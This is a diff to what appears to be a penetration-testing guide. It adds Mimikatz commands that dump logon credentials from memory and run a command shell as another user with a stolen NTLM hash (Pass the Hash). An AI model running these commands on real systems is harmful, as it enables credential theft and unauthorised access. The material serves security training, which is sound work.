@@ -3911,7 +3911,20 @@ The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https
 * **HASH** - NTLM or rc4 hash of the user's password.
 * **DOMAIN** - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
 
-**Usage**
+**Start Mimikatz as Adminitrator**
+
+```bash
+mimikatz.exe
+```
+
+**Get the hashes**
+
+```bash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
+
+**Run a CMD as th desired user**
 
 ```bash
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
